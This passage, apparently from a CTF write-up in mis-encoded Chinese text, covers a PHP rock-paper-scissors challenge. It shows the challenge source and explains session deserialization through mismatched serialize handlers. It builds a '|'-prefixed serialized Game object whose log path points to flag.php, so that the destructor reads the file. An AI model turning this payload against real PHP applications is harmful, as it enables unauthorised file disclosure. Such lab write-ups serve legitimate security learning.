</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;You Lose&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">play</span> <span class="o">==</span> <span class="s2">&#34;RockScissors&#34;</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">play</span> <span class="o">==</span> <span class="s2">&#34;PaperRock&#34;</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">play</span> <span class="o">==</span> <span class="s2">&#34;ScissorsPaper&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">,</span><span class="s2">&#34;&lt;div&gt;&#34;</span><span class="o">.</span><span class="nv">$output</span><span class="p">[</span><span class="nv">$user_input</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39; VS &#39;</span><span class="o">.</span><span class="nv">$output</span><span class="p">[</span><span class="nv">$bot_input</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34; You Win&lt;/div&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nx">FILE_APPEND</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;You Win&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;&lt;h5&gt;Game History&lt;/h5&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;div class=&#39;all_output&#39;&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/div&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;IE=edge&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;icon&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;icon.png&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Rock Paper Scissors<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- post &#39;source&#39; to view something --&gt;</span> 
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;style.css&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="cp">    session_start();
</span></span></span><span class="line"><span class="cl"><span class="cp">    if(isset($_POST[&#39;name&#39;])){
</span></span></span><span class="line"><span class="cl"><span class="cp">        $_SESSION[&#39;name&#39;]=$_POST[&#39;name&#39;];
</span></span></span><span class="line"><span class="cl"><span class="cp">        $_SESSION[&#39;win&#39;]=0;
</span></span></span><span class="line"><span class="cl"><span class="cp">    }
</span></span></span><span class="line"><span class="cl"><span class="cp">    if(!isset($_SESSION[&#39;name&#39;])){
</span></span></span><span class="line"><span class="cl"><span class="cp">        ?&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">h5</span><span class="p">&gt;</span>Input your name :<span class="p">&lt;/</span><span class="nt">h5</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;result&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;name&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">input</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span><span class="p">&gt;</span>submit<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;?php exit();
</span></span></span><span class="line"><span class="cl"><span class="cp">    }
</span></span></span><span class="line"><span class="cl"><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="cp">echo &#34;&lt;h5&gt;Welecome &#34;.$_SESSION[&#39;name&#39;].&#34;, now you win &#34;.$_SESSION[&#39;win&#39;].&#34; rounds.&lt;/h5&gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="cp">$Game=new Game($_SESSION[&#39;name&#39;]);
</span></span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h5</span><span class="p">&gt;</span>Make your choice :<span class="p">&lt;/</span><span class="nt">h5</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Rock&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;choice&#34;</span><span class="p">&gt;</span><span class="ni">&amp;#9996;&amp;#127995;</span><span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Paper&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;choice&#34;</span><span class="p">&gt;</span><span class="ni">&amp;#9994;&amp;#127995;</span><span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Scissors&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;choice&#34;</span><span class="p">&gt;</span><span class="ni">&amp;#9995;&amp;#127995;</span><span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cp">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="cp">    $choices = array(&#34;Rock&#34;, &#34;Paper&#34;, &#34;Scissors&#34;);
</span></span></span><span class="line"><span class="cl"><span class="cp">    $rand_bot = array_rand($choices);
</span></span></span><span class="line"><span class="cl"><span class="cp">    $bot_input = $choices[$rand_bot];
</span></span></span><span class="line"><span class="cl"><span class="cp">    if(isset($_POST[&#34;choice&#34;]) AND in_array($_POST[&#34;choice&#34;],$choices)){
</span></span></span><span class="line"><span class="cl"><span class="cp">        $user_input = $_POST[&#34;choice&#34;];
</span></span></span><span class="line"><span class="cl"><span class="cp">        $result=$Game-&gt;play($user_input,$bot_input);
</span></span></span><span class="line"><span class="cl"><span class="cp">        if ($result==&#34;You Win&#34;){
</span></span></span><span class="line"><span class="cl"><span class="cp">            $_SESSION[&#39;win&#39;]+=1;
</span></span></span><span class="line"><span class="cl"><span class="cp">        } else {
</span></span></span><span class="line"><span class="cl"><span class="cp">            $_SESSION[&#39;win&#39;]=0;
</span></span></span><span class="line"><span class="cl"><span class="cp">        }
</span></span></span><span class="line"><span class="cl"><span class="cp">    } else {
</span></span></span><span class="line"><span class="cl"><span class="cp">        ?&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;flag&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;flag&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;flag&#34;</span><span class="p">&gt;</span>get flag<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;source&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;source&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;source&#34;</span><span class="p">&gt;</span>show source<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="cp">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="cp">        if(isset($_POST[&#34;flag&#34;])){
</span></span></span><span class="line"><span class="cl"><span class="cp">            if($_SESSION[&#39;win&#39;]&lt;100){
</span></span></span><span class="line"><span class="cl"><span class="cp">                echo &#34;&lt;div&gt;You need to win 100 rounds in a row to get flag.&lt;/div&gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="cp">            } else {
</span></span></span><span class="line"><span class="cl"><span class="cp">                echo &#34;Here is your flag:&#34;.$flag;
</span></span></span><span class="line"><span class="cl"><span class="cp">            }
</span></span></span><span class="line"><span class="cl"><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">        }
</span></span></span><span class="line"><span class="cl"><span class="cp">    }
</span></span></span><span class="line"><span class="cl"><span class="cp">    ?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="é¢˜ç›®åˆ†æ-1">é¢˜ç›®åˆ†æ</h4>
<p><strong>hintï¼šæˆ‘ä¸ºå•¥è¦ini_setæ¥ç€ hint2ï¼šphp.inié…ç½®çš„ç¨€çƒ‚</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/images/%e5%89%aa%e5%88%80%e7%9f%b3%e5%a4%b4%e5%b8%83-3.png"
	
	
	
	loading="lazy"
	
	
></p>
<p>æ ¹æ®è¿™ä¸¤ä¸ªä¸åŒçš„phpå¤„ç†å™¨ï¼Œphp_serializeå’Œphpï¼Œå¯ä»¥å®ç°sessionååºåˆ—åŒ–çš„æ„é€ </p>
<p><strong>å…³é”®ç±»ä»¥åŠç±»ä¸­çš„å…³é”®å‡½æ•°</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Game</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$log</span><span class="p">,</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$play</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span> <span class="o">=</span> <span class="s1">&#39;/tmp/&#39;</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.log&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">        	<span class="k">echo</span> <span class="s2">&#34;&lt;h5&gt;Game History&lt;/h5&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        	<span class="k">echo</span> <span class="s2">&#34;&lt;div class=&#39;all_output&#39;&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        	<span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        	<span class="k">echo</span> <span class="s2">&#34;&lt;/div&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è§‚å¯Ÿåˆ°__destruct()å‡½æ•°çš„echo file_get_contents($this-&gt;log);ï¼Œç”±æºç ä¸­å‘ç°include &ldquo;flag.php&rdquo;;ï¼Œå¯ä»¥å°†$logèµ‹å€¼ä¸º/var/www/html/flag.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Game</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$log</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/flag.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Game</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"># è¾“å‡ºç»“æœï¼šO:4:&#34;Game&#34;:1:{s:3:&#34;log&#34;;s:22:&#34;/var/www/html/flag.php&#34;;}
</span></span></span><span class="line"><span class="cl"><span class="err"># åŠ ä¸€ä¸ª|ï¼š|O:4:&#34;Game&#34;:1:{s:3:&#34;log&#34;;s:22:&#34;/var/www/html/flag.php&#34;;}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨phpå¤„ç†å™¨php_serializeçš„å¤„ç†ä¸‹ï¼Œå­˜å‚¨è¯¥åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œ|(ç®¡é“ç¬¦)åªæ˜¯ä¸€ä¸ªæ™®é€šå­—ç¬¦ï¼Œä½†æ˜¯phpå¤„ç†å™¨phpçš„å¤„ç†ä¸‹ï¼Œè¯»å–è¯¥åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œ |(ç®¡é“ç¬¦)è¢«ä½œä¸ºåˆ†å‰²é”®åå’Œé”®å€¼çš„åˆ†å‰²çº¿ï¼Œæ‰€ä»¥|åé¢çš„å†…å®¹ä¼šè¢«ååºåˆ—åŒ–ã€‚</p>
<p>è§‚å¯Ÿä»£ç ä¼šå‘ç°æºç æ˜¯æ²¡æœ‰$_SESSIONå˜é‡èµ‹å€¼ä½†ç¬¦åˆä½¿ç”¨ä¸åŒçš„å¼•æ“æ¥å¤„ç†sessionæ–‡ä»¶ï¼Œæ‰€ä»¥ä½¿ç”¨phpä¸­çš„upload_processæœºåˆ¶ã€‚</p>
<h4 id="çŸ¥è¯†ç‚¹">çŸ¥è¯†ç‚¹</h4>
<h5 id="file_get_contents-å‡½æ•°">file_get_contents() å‡½æ•°</h5>
<p>file_get_contents() æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚è¯¥å‡½æ•°æ˜¯ç”¨äºæŠŠæ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæœåŠ¡å™¨æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚</p>
<h5 id="ä»€ä¹ˆæ˜¯session">ä»€ä¹ˆæ˜¯sessionï¼Ÿ</h5>
<p>sessionï¼šä¼šè¯æ§åˆ¶ã€‚sessionå¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚</p>
<p>å½“ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºçš„ Web é¡µä¹‹é—´è·³è½¬æ—¶ï¼Œå­˜å‚¨åœ¨ Session å¯¹è±¡ä¸­çš„å˜é‡å°†ä¸ä¼šä¸¢å¤±ï¼Œè€Œæ˜¯åœ¨æ•´ä¸ªç”¨æˆ·ä¼šè¯ä¸­ä¸€ç›´å­˜åœ¨ä¸‹å»ã€‚å½“ç”¨æˆ·è¯·æ±‚æ¥è‡ªåº”ç”¨ç¨‹åºçš„ Web é¡µæ—¶ï¼Œå¦‚æœè¯¥ç”¨æˆ·è¿˜æ²¡æœ‰ä¼šè¯ï¼Œåˆ™ Web æœåŠ¡å™¨å°†è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª Session å¯¹è±¡ã€‚å½“ä¼šè¯è¿‡æœŸæˆ–è¢«æ”¾å¼ƒåï¼ŒæœåŠ¡å™¨å°†ç»ˆæ­¢è¯¥ä¼šè¯ã€‚</p>
<h5 id="sessionå·¥ä½œæµç¨‹">sessionå·¥ä½œæµç¨‹</h5>
<p>å½“ç¬¬ä¸€æ¬¡è®¿é—®ç½‘ç«™æ—¶ï¼ŒSeesion_start()å‡½æ•°å°±ä¼šåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„Session IDï¼Œå¹¶è‡ªåŠ¨é€šè¿‡HTTPçš„å“åº”å¤´ï¼Œå°†è¿™ä¸ªSession IDä¿å­˜åˆ°å®¢æˆ·ç«¯Cookieä¸­ã€‚åŒæ—¶ï¼Œä¹Ÿåœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªä»¥Session IDå‘½åçš„æ–‡ä»¶ï¼Œç”¨äºä¿å­˜è¿™ä¸ªç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚</p>
<p>å½“åŒä¸€ä¸ªç”¨æˆ·å†æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™æ—¶ï¼Œä¼šè‡ªåŠ¨é€šè¿‡HTTPçš„è¯·æ±‚å¤´å°†Cookieä¸­ä¿å­˜çš„Seesion IDå†æ¬¡æºå¸¦ï¼ŒSession_start()å‡½æ•°ä¸ä¼šå†åˆ†é…æ–°çš„Session IDï¼Œè€Œæ˜¯åœ¨æœåŠ¡å™¨çš„ç¡¬ç›˜ä¸­å»å¯»æ‰¾å’Œè¿™ä¸ªSession IDåŒåçš„Sessionæ–‡ä»¶ï¼Œå°†ä¹‹å‰ä¸ºè¿™ä¸ªç”¨æˆ·ä¿å­˜çš„ä¼šè¯ä¿¡æ¯è¯»å–å‡ºæ¥ã€‚</p>
<h5 id="session_startä½œç”¨">session_start()ä½œç”¨</h5>
<p>å½“ä¼šè¯è‡ªåŠ¨å¼€å§‹æˆ–åˆ©ç”¨session_start()æ‰‹åŠ¨å¼€å§‹ï¼Œ PHP å†…éƒ¨ä¼šä¾æ®å®¢æˆ·ç«¯ä¼ æ¥çš„PHPSESSIDæ¥è·å–ç°æœ‰çš„å¯¹åº”çš„ä¼šè¯æ•°æ®ï¼ˆå³sessionæ–‡ä»¶ï¼‰ï¼Œ PHP ä¼šè‡ªåŠ¨ååºåˆ—åŒ–sessionæ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶å¡«å……åˆ° $_SESSION è¶…çº§å…¨å±€å˜é‡ä¸­ã€‚</p>
<p>å¦‚æœä¸å­˜åœ¨å¯¹åº”çš„ä¼šè¯æ•°æ®ï¼Œåˆ™åˆ›å»ºåä¸ºsess_PHPSESSID(å®¢æˆ·ç«¯ä¼ æ¥çš„)çš„æ–‡ä»¶ã€‚å¦‚æœå®¢æˆ·ç«¯æœªå‘é€PHPSESSIDï¼Œåˆ™åˆ›å»ºä¸€ä¸ªç”±32ä¸ªå­—æ¯ç»„æˆçš„PHPSESSIDï¼Œå¹¶è¿”å›set-cookieã€‚</p>
<h5 id="phpiniä¸­å…³äºsessionçš„ç›¸å…³é…ç½®">php.iniä¸­å…³äºsessionçš„ç›¸å…³é…ç½®</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">session.save_path=&#34;&#34; //è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„
</span></span><span class="line"><span class="cl">session.save_handler=&#34;&#34; //è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)
</span></span><span class="line"><span class="cl">session.auto_start boolen //æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯é»˜è®¤ä¸º0ä¸å¯åŠ¨
</span></span><span class="line"><span class="cl">session.serialize_handler string //å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php
</span></span></code></pre></td></tr></table>
</div>
